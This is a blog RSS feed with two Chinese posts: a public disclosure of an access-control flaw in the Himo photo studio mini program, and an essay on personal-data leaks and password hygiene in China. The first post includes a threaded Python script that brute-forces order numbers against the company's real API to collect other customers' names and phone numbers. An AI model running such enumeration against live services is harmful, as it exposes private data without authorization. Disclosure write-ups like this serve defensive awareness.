<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Information Security on Vincent&#39;s Notes</title>
    <link>https://missuo.me/tags/information-security/</link>
    <description>Recent content in Information Security on Vincent&#39;s Notes</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <lastBuildDate>Mon, 29 May 2023 00:31:40 +0800</lastBuildDate><atom:link href="https://missuo.me/tags/information-security/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Himo Mini Program Security Issues</title>
      <link>https://missuo.me/posts/himo-security/</link>
      <pubDate>Mon, 29 May 2023 00:31:40 +0800</pubDate>
      
      <guid>https://missuo.me/posts/himo-security/</guid>
      <description>因为预约了 6 月头在香港的 F1 签证，所以需要准备一张 签证照，在家这边的小城市，也没什么选择，没有 天真蓝，最好的就是 海马体 了。海马体生意还挺好，当天都约不到，只能约到 5 月 14 日星期天
在 2023 年 5 月 16 日我已经向海马体的技术团队提交了 可能存在的安全问题。直到今天（2023 年 5 月 29 日），我没有收到海马体技术团队的任何回信，我决定在我的个人博客公开。
我在拍完照之后，现场等待了一会，大概也就不到半个小时，小姐姐就基本上修好了，让我确认一下是否有需要修改的地方，没有的话就开始打印了。打印完之后，她告诉我电子版随时可以在 海马体小程序 随时下载。这一点我觉得非常方便。
晚上在家的时候，突然想到海马体小程序的这回事，我在想这些个人的照片应该是存储在 OSS 上的，但是我在想会不会有可能是订单号+编号这样子的文件名来存储的，简单说就是这个图片的链接是有规律的。如果真的是这样的话，我就可以轻松拿到所有用户的照片。
我在 iPhone 上开启了抓包，结果发现所有的照片的外链确实是固定的，只不过文件名是随机的一串字符串，似乎没有任何规律，应该就是完全随机的。然而有一个 API 会返回这个用户所有的照片的文件名，这个 API 传递的参数似乎没有类似于 userID 这类的参数，也就是说完全按照 Cookie 来判断哪位用户的。到这里，想拿到别的用户的照片外链的计划算是泡汤了。
我又想到因为每一次的照片肯定是和订单绑定的，也就是说一个 签证照 订单，理论上应该就固定的只有 4 张图。我又仔细地看了一下订单返回的参数，比较有价值的就是用户名、手机号这些，别的都是预约的门店、门店地址、门店联系电话、订单价格之类的一些东西。但是有一个意外的惊喜，我发现订单详情的 API 在 GET 请求的时候携带了 orderNo 参数，我赶紧使用 API 测试工具，发起了请求，把 orderNo 改一个数字，API 返回了 “订单不存在”。心里窃喜，竟然返回的是订单不存在，而不是无权限，说明我的 Cookie 应该可以查看别人的订单信息，我可以拿到任何注册 海马体小程序 用户的 联系方式。
我的订单的 orderNo 是 T2023051413359999，以首字母 T 开头，前 8 位是当天的日期，后面的 8 个纯数字应该是随机的，但是这难不倒我，手搓一个 Python 脚本，从 00000000 穷举到 99999999 不就完事了，在多线程的帮助下，简直是小菜一碟。</description>
      <content:encoded><![CDATA[<blockquote>
<p>因为预约了 6 月头在香港的 F1 签证，所以需要准备一张 <strong>签证照</strong>，在家这边的小城市，也没什么选择，没有 <strong>天真蓝</strong>，最好的就是 <strong>海马体</strong> 了。海马体生意还挺好，当天都约不到，只能约到 5 月 14 日星期天</p>
</blockquote>
<p>在 2023 年 5 月 16 日我已经向海马体的技术团队提交了 <strong>可能存在的安全问题</strong>。直到今天（2023 年 5 月 29 日），我没有收到海马体技术团队的任何回信，我决定在我的个人博客公开。</p>
<p>我在拍完照之后，现场等待了一会，大概也就不到半个小时，小姐姐就基本上修好了，让我确认一下是否有需要修改的地方，没有的话就开始打印了。打印完之后，她告诉我电子版随时可以在 <strong>海马体小程序</strong> 随时下载。这一点我觉得非常方便。</p>
<p>晚上在家的时候，突然想到海马体小程序的这回事，我在想这些个人的照片应该是存储在 <strong>OSS</strong> 上的，但是我在想会不会有可能是订单号+编号这样子的文件名来存储的，简单说就是这个图片的链接是有规律的。如果真的是这样的话，我就可以轻松拿到所有用户的照片。</p>
<p>我在 iPhone 上开启了抓包，结果发现所有的照片的外链确实是固定的，只不过文件名是随机的一串字符串，似乎没有任何规律，应该就是完全随机的。然而有一个 API 会返回这个用户所有的照片的文件名，这个 API 传递的参数似乎没有类似于 <strong>userID</strong> 这类的参数，也就是说完全按照 <strong>Cookie</strong> 来判断哪位用户的。到这里，想拿到别的用户的照片外链的计划算是泡汤了。</p>
<p>我又想到因为每一次的照片肯定是和订单绑定的，也就是说一个 <strong>签证照</strong> 订单，理论上应该就固定的只有 4 张图。我又仔细地看了一下订单返回的参数，比较有价值的就是用户名、手机号这些，别的都是预约的门店、门店地址、门店联系电话、订单价格之类的一些东西。但是有一个意外的惊喜，我发现订单详情的 API 在 GET 请求的时候携带了 <strong>orderNo</strong> 参数，我赶紧使用 API 测试工具，发起了请求，把 <strong>orderNo</strong> 改一个数字，API 返回了 “订单不存在”。心里窃喜，竟然返回的是订单不存在，而不是无权限，说明我的 <strong>Cookie</strong> 应该可以查看别人的订单信息，我可以拿到任何注册 <strong>海马体小程序</strong> 用户的 <strong>联系方式</strong>。</p>
<p>我的订单的 <strong>orderNo</strong> 是 <strong>T2023051413359999</strong>，以首字母 T 开头，前 8 位是当天的日期，后面的 8 个纯数字应该是随机的，但是这难不倒我，手搓一个 <strong>Python</strong> 脚本，从 <strong>00000000</strong> 穷举到 <strong>99999999</strong> 不就完事了，在多线程的帮助下，简直是小菜一碟。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># 这是示例代码，不能直接运行</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">threading</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">httpx</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="s2">&#34;app-key&#34;</span><span class="p">:</span> <span class="s2">&#34;himo-wx-mini-program&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="s2">&#34;content-type&#34;</span><span class="p">:</span> <span class="s2">&#34;application/json&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="s2">&#34;X-Stream-Id&#34;</span><span class="p">:</span> <span class="s2">&#34;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.37(0x18002528) NetType/WIFI Language/en&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="s2">&#34;Referer&#34;</span><span class="p">:</span> <span class="s2">&#34;https://servicewechat.com/xxxxx/456/page-frame.html&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">semaphore</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Semaphore</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">getOrderDetails</span><span class="p">(</span><span class="n">orderId</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">		<span class="k">with</span> <span class="n">semaphore</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">			<span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;https://api-gateway.hzmantu.com/appointment_platform/order/order/order_detail?orderNo=T20230515</span><span class="si">{</span><span class="n">orderId</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">			<span class="n">resp</span> <span class="o">=</span> <span class="n">httpx</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="n">resp</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">				<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;result.json&#34;</span><span class="p">,</span> <span class="s2">&#34;a&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">					<span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">				<span class="nb">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="k">finally</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">		<span class="n">semaphore</span><span class="o">.</span><span class="fm">__exit__</span><span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			
</span></span><span class="line"><span class="cl"><span class="n">threads</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">orderId</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10013132</span><span class="p">,</span> <span class="mi">99999999</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">thread</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">getOrderDetails</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">orderId</span><span class="p">,))</span>
</span></span><span class="line"><span class="cl">	<span class="n">thread</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">	<span class="n">threads</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">thread</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">thread</span> <span class="ow">in</span> <span class="n">threads</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">	<span class="n">thread</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>
</span></span></code></pre></div><p>很快，Python 的程序跑出了结果，验证了我的猜想。来自 <strong>武汉</strong> 的一位幸运网友。（<strong>为了保护他人隐私，已将关键信息打码</strong>）</p>
<p><img loading="lazy" src="https://static.nisekoo.com/blog/202305295XA9GS.png" alt="202305295XA9GS"  />
</p>
<p>我在 5 月 15 日凌晨发了一条朋友圈和微博，在微博艾特了 <strong>缦图摄影</strong> 和 <strong>海马体照相馆</strong>。很荣幸，在微博私信和我的邮箱都有工作人员联系我，下午醒来的时候我及时地回复了邮件，很遗憾的是过去了接近 2 周的时间，我没有收到任何回信，我不知道他们是修复了这个问题，还是说直接忽略了。之后我也没有再去验证。</p>
<p><img loading="lazy" src="https://static.nisekoo.com/blog/20230529fzK3kq.png" alt="20230529fzK3kq"  />
</p>
<p>其实我写这篇博客，只是想分享这一段有趣的小研究，也算是为海马体做出一点点贡献。<strong>海马体小程序</strong> 其实只是一个很好的例子，其实他们并不是一家小公司，而是一家在中国大陆范围内规模挺大的公司。除了海马体，在过去的时间里我还有研究过很多类似的小程序，很遗憾，大部分小程序都没有在 <strong>用户个人信息</strong> 做到很好保护。</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Information Security in China</title>
      <link>https://missuo.me/posts/information-security-in-china/</link>
      <pubDate>Sun, 03 Jul 2022 03:45:26 +0000</pubDate>
      
      <guid>https://missuo.me/posts/information-security-in-china/</guid>
      <description>信息安全，也许你从来也没有关注过这个词。又或者信息泄露这件事在你身上从来没有发生过，所以你根本不在乎。
其实，在上大学之前，我和大多数人一样几乎没有去关注过信息安全这个领域。直到上了大学，开始接触计算机相关的知识之后，我开始注重自己的个人隐私，试着在日常生活中尽可能地去保护自己的隐私。我的所有购物平台的收件人没有真名，几乎都是类似于库克之类的名字，我的收件地址都没有具体到几幢几室，所以一般都会被放在丰巢。但是这样做，还有一个非常不妥的地方，那就是你的手机号码必须要填写真实的，否则你搜不到丰巢的取件码。顺丰和京东是我最喜欢的快递公司，当然他们也是快递业内做的最大的，他们的运单上面用户的手机号都不是完整的，如果你平时注意的话，中间都是用 星号 代替的，快递员只能通过虚拟号码来拨打。而别的快递公司的运单上，几乎都是 11 位完整的电话号码。设想一下，如果小区的清洁人员和某个组织有所合作，每天就是收集垃圾堆里的快递运单上的手机号，那么几乎可以获取到整个小区业主的电话。这看起来似乎是个不太聪明的方法，如果找物业买，可以轻松得到所有的业主信息，据我所知，这样的事情的确在大部分物业都在做这样的事情。除了快递之外，外卖是另一个信息泄露的重要途径，虽然目前的主流外卖平台，饿了么和美团打印的外卖单上都是虚拟的号码，但是外卖单上有个比手机号更重要的信息就是非常具体的地址，我相信没有人会为了保护隐私地址写小区名字，不写几幢几室，然后每次都去小区门口自己拿外卖，这似乎就不能凸显外卖的优势了。注意不要去任何平台购买饿了么年费会员，很有可能会登录你的账号泄露你所有的外卖收货地址。
说完日常生活的快递和外卖，再来说说民宿和酒店，酒店需要登记入住人信息，但是我相信稍高档一些的酒店的信息只是录入系统传给公安。但是民宿呢，在 Airbnb 和美团等等软件上，在你订购的时候需要填写真实姓名和证件号码。但是奇怪的事情是，当你到了入住那天下午两点，跟房东询问如何入住时，大部分的房东都会要求你拍摄身份证正反面发给他（注意是通过微信的方式）。一般在这种情况下，我是非常反感的，通过微信这样的方式私底下要别人证件。大多数情况下，我会向房东解释，不通过平台是不能够索要身份证件的，有些房东还算好说话，也就不再追究下去了。而有的房东穷追不舍一定要你发给他，这个时候其实你有两个选择，一个简单的选择就是妥协，另一个选择就是坚持自己，那你就只能选择不住，或者就向平台反馈这件事情，但是第二种选择必定会给你带来不少麻烦，如果你选择不住，你得换一个地方，你也不确定你新找的地方是不是还是需要让你发身份证，你向平台投诉，平台客服又得找房东去核实，必然会浪费几十分钟甚至几个小时。回到最前面，如果你妥协了把身份证件发给房东了，你又如何保证房东除了出租民宿之外，还有一份副业会不会就是出售个人身份信息（当然我没有证据，只是恶意地揣测）。
那么除了日常和旅行之外，真的就没有别的信息泄露的途径了吗？真实情况远远不是这样的。在 2020 年的时候，我在一个群里看到了一个链接，只要打开链接，输入 QQ 号，就可以知道该 QQ 绑定的手机号，后来又有了微博号查绑定手机。这就是网上疯狂的 8 亿 QQ 和 5 亿微博，很荣幸我也亲眼见到过这两份数据库。这两份数据库的带来的后果是什么呢，只要 QQ 和微博是 2020 年之前注册的，你就可以轻松得到对方的手机号，可以添加微信，通过支付宝转账又可以知道对方的名字，通过手机号和名字又可以知道很多很多信息。这还不是最严重的，再后来我发现，只要通过一个名字就可以知道他的很多信息，包括教育经历等等。经过我的考证，在浙江省内接受过小学、初中、高中或者职校的几乎所有学生，只要通过名字都可以查到姓名、身份证号码、家长名字、家长电话、家庭住址、学校和班级。我有怀疑过是学校的工作人员出卖了数据，后来我否定了这样的想法，很有可能是教育局泄露了这份数据。当然学校也许也在卖，否则你上学的时候你爸妈手机为什么天天会收到培训机构的电话呢，甚至比你还先知道你期中考试考了多少分。
这些都是过去的数据泄露，来讲讲最近的。2022 年 6 月 21 日，超星学习通 1.7 亿用户数据泄露，虽然官方否定了这个传闻，但是经过证实，这就是事实，已经有人摆上货架售卖 500USDT，在某些地方也已经可以查到这份数据。没用过超星学习通可能不知道这意味着什么，毫不夸张地说，在中国大陆 80-90%的高校都在使用超星学习通教学，这就意味着所有正在读书的学生的信息都被泄露了。这份数据包括姓名、学号、性别、手机号和密码。官方轻描淡写地出来辟谣，还说密码是加密的，这个密码的问题之后会讲到。
如果说 1.7 亿，相比于中国 14 亿人口来说，不值得一提的话，那 2022 年 7 月 2 日的这个传闻泄露的数据包含 10 亿多中国公民，包含个人信息、犯罪记录、疫情数据。这是迄今为止中国大陆发生的最大的信息泄露事件。境外网站写的是 Shanghai GOV National Police 的漏洞泄露的数据，目前为得到证实，售价 10BTC。结合国内知名黑客 sunwear 的微博来看，应该是真的。
最后我想说说社交账号和密码问题。社交账号上建议，抖音号和微信号不要设置与自己的名字全拼、缩写、生日、手机号、QQ 号相关的。抖音个人简介里，尽量不要写自己的微博账号。给别人微信的时候，尽量不要给 QQ 号或者手机号。支付宝务必关闭手机号搜索。讲讲密码，我相信大部分人的习惯都一样，几乎所有平台的密码都是一样的，而且密码都是 ZJL021212，名字缩写加出生日期，或者出生日期加名字缩写。非常不建议采用这样的密码，最好是和你本人的个人信息没有任何关系的密码。如果不涉及财产的网站和软件，可以采用相同的密码，当然最好是每个平台都不一样，但是这样记密码的成本太高。请务必不要相信学习通所说的密码加密就不会被泄露。就举个例子，MD5 加密，这样的加密方式设计的时候就是不可逆的，例如 12345，加密后是 827ccb0eea8a706c4c34a16891f84e7b，你如果想知道 827ccb0eea8a706c4c34a16891f84e7b 的明文是什么，必须要 123、1234、12345 这样子的明文一个一个加密之后去比对，看似天衣无缝的加密算法，实际上目前 MD5 密文几乎都可以用彩虹表破解。所以加密后的密码被泄露也不一定是安全的。</description>
      <content:encoded><![CDATA[<blockquote>
<p>信息安全，也许你从来也没有关注过这个词。又或者信息泄露这件事在你身上从来没有发生过，所以你根本不在乎。</p>
</blockquote>
<p>其实，在上大学之前，我和大多数人一样几乎没有去关注过信息安全这个领域。直到上了大学，开始接触计算机相关的知识之后，我开始注重自己的个人隐私，试着在日常生活中尽可能地去保护自己的隐私。我的所有购物平台的收件人没有真名，几乎都是类似于库克之类的名字，我的收件地址都没有具体到几幢几室，所以一般都会被放在丰巢。但是这样做，还有一个非常不妥的地方，那就是你的手机号码必须要填写真实的，否则你搜不到丰巢的取件码。顺丰和京东是我最喜欢的快递公司，当然他们也是快递业内做的最大的，他们的运单上面用户的手机号都不是完整的，如果你平时注意的话，中间都是用 星号 代替的，快递员只能通过虚拟号码来拨打。而别的快递公司的运单上，几乎都是 11 位完整的电话号码。设想一下，如果小区的清洁人员和某个组织有所合作，每天就是收集垃圾堆里的快递运单上的手机号，那么几乎可以获取到整个小区业主的电话。这看起来似乎是个不太聪明的方法，如果找物业买，可以轻松得到所有的业主信息，据我所知，这样的事情的确在大部分物业都在做这样的事情。除了快递之外，外卖是另一个信息泄露的重要途径，虽然目前的主流外卖平台，饿了么和美团打印的外卖单上都是虚拟的号码，但是外卖单上有个比手机号更重要的信息就是非常具体的地址，我相信没有人会为了保护隐私地址写小区名字，不写几幢几室，然后每次都去小区门口自己拿外卖，这似乎就不能凸显外卖的优势了。注意不要去任何平台购买饿了么年费会员，很有可能会登录你的账号泄露你所有的外卖收货地址。</p>
<p>说完日常生活的快递和外卖，再来说说民宿和酒店，酒店需要登记入住人信息，但是我相信稍高档一些的酒店的信息只是录入系统传给公安。但是民宿呢，在 Airbnb 和美团等等软件上，在你订购的时候需要填写真实姓名和证件号码。但是奇怪的事情是，当你到了入住那天下午两点，跟房东询问如何入住时，大部分的房东都会要求你拍摄身份证正反面发给他（注意是通过微信的方式）。一般在这种情况下，我是非常反感的，通过微信这样的方式私底下要别人证件。大多数情况下，我会向房东解释，不通过平台是不能够索要身份证件的，有些房东还算好说话，也就不再追究下去了。而有的房东穷追不舍一定要你发给他，这个时候其实你有两个选择，一个简单的选择就是妥协，另一个选择就是坚持自己，那你就只能选择不住，或者就向平台反馈这件事情，但是第二种选择必定会给你带来不少麻烦，如果你选择不住，你得换一个地方，你也不确定你新找的地方是不是还是需要让你发身份证，你向平台投诉，平台客服又得找房东去核实，必然会浪费几十分钟甚至几个小时。回到最前面，如果你妥协了把身份证件发给房东了，你又如何保证房东除了出租民宿之外，还有一份副业会不会就是出售个人身份信息（当然我没有证据，只是恶意地揣测）。</p>
<p>那么除了日常和旅行之外，真的就没有别的信息泄露的途径了吗？真实情况远远不是这样的。在 2020 年的时候，我在一个群里看到了一个链接，只要打开链接，输入 QQ 号，就可以知道该 QQ 绑定的手机号，后来又有了微博号查绑定手机。这就是网上疯狂的 8 亿 QQ 和 5 亿微博，很荣幸我也亲眼见到过这两份数据库。这两份数据库的带来的后果是什么呢，只要 QQ 和微博是 2020 年之前注册的，你就可以轻松得到对方的手机号，可以添加微信，通过支付宝转账又可以知道对方的名字，通过手机号和名字又可以知道很多很多信息。这还不是最严重的，再后来我发现，只要通过一个名字就可以知道他的很多信息，包括教育经历等等。经过我的考证，在浙江省内接受过小学、初中、高中或者职校的几乎所有学生，只要通过名字都可以查到姓名、身份证号码、家长名字、家长电话、家庭住址、学校和班级。我有怀疑过是学校的工作人员出卖了数据，后来我否定了这样的想法，很有可能是教育局泄露了这份数据。当然学校也许也在卖，否则你上学的时候你爸妈手机为什么天天会收到培训机构的电话呢，甚至比你还先知道你期中考试考了多少分。</p>
<p>这些都是过去的数据泄露，来讲讲最近的。2022 年 6 月 21 日，超星学习通 1.7 亿用户数据泄露，虽然官方否定了这个传闻，但是经过证实，这就是事实，已经有人摆上货架售卖 500USDT，在某些地方也已经可以查到这份数据。没用过超星学习通可能不知道这意味着什么，毫不夸张地说，在中国大陆 80-90%的高校都在使用超星学习通教学，这就意味着所有正在读书的学生的信息都被泄露了。这份数据包括姓名、学号、性别、手机号和密码。官方轻描淡写地出来辟谣，还说密码是加密的，这个密码的问题之后会讲到。</p>
<p>如果说 1.7 亿，相比于中国 14 亿人口来说，不值得一提的话，那 2022 年 7 月 2 日的这个传闻泄露的数据包含 10 亿多中国公民，包含个人信息、犯罪记录、疫情数据。这是迄今为止中国大陆发生的最大的信息泄露事件。境外网站写的是 <code>Shanghai GOV National Police</code> 的漏洞泄露的数据，目前为得到证实，售价 10BTC。结合国内知名黑客 <code>sunwear</code> 的微博来看，应该是真的。</p>
<p>最后我想说说社交账号和密码问题。社交账号上建议，抖音号和微信号不要设置与自己的名字全拼、缩写、生日、手机号、QQ 号相关的。抖音个人简介里，尽量不要写自己的微博账号。给别人微信的时候，尽量不要给 QQ 号或者手机号。支付宝务必关闭手机号搜索。讲讲密码，我相信大部分人的习惯都一样，几乎所有平台的密码都是一样的，而且密码都是 ZJL021212，名字缩写加出生日期，或者出生日期加名字缩写。非常不建议采用这样的密码，最好是和你本人的个人信息没有任何关系的密码。如果不涉及财产的网站和软件，可以采用相同的密码，当然最好是每个平台都不一样，但是这样记密码的成本太高。请务必不要相信学习通所说的密码加密就不会被泄露。就举个例子，MD5 加密，这样的加密方式设计的时候就是不可逆的，例如 12345，加密后是 827ccb0eea8a706c4c34a16891f84e7b，你如果想知道 827ccb0eea8a706c4c34a16891f84e7b 的明文是什么，必须要 123、1234、12345 这样子的明文一个一个加密之后去比对，看似天衣无缝的加密算法，实际上目前 MD5 密文几乎都可以用彩虹表破解。所以加密后的密码被泄露也不一定是安全的。</p>
<p>最后的最后，希望中国能再多一些网络安全专家，希望我们每个人的隐私都能被好好地保护起来。</p>
<p><strong>以上信息不一定都是真实的，很多来自互联网，请理性看待。</strong></p>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
